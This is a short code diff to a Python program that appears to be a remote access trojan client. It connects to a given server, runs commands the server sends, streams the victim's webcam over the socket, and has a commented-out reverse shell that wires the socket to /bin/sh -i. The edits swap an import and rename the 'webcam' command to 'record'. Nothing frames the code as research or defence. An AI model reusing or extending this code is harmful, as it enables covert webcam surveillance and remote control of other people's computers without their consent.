@@ -2,7 +2,7 @@ import socket
 import os
 import subprocess
 import sys
-from subprocess import run
+import subprocess
 import cv2
 import pickle
 import struct
@@ -16,7 +16,7 @@ import imutils
 # 	os.dup2(s.fileno(), 0) 
 # 	os.dup2(s.fileno(), 1) 
 # 	os.dup2(s.fileno(), 2) 
-# 	run(["/bin/sh","-i"])
+# 	subprocess.run(["/bin/sh","-i"])
 
 
 # Capture video with webcam
@@ -53,7 +53,7 @@ def main(SERVER_HOST, SERVER_PORT):
 				output = str(e)
 			else:
 				output = ""
-		elif splitted_command[0] == "webcam":
+		elif splitted_command[0] == "record":
 			stream = VideoStream(s)
 			stream.send()
 		#elif command == "shell":
